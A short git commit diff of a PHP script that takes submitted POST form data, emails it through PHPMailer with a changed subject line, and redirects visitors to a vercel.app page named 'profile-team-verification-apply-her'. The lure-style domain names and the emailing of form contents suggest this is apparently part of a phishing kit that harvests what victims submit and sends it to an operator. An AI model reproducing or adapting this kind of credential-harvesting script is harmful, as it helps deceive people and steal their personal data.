1b15a4a95094bf477e9c13b96fe9940a3d7b8c9c
mhussainofficial03 <mhussain.official03@gmail.com>
2025-08-22 00:27:24 +0800

    Update and rename awais.php to ismail.php

--- ismail.php
+++ ismail.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://apply-form-request-fix-on-here.vercel.app/");
+header("Location: https://profile-team-verification-apply-her.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'AWAIS';
+        $mail->Subject = 'ISMAIL';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
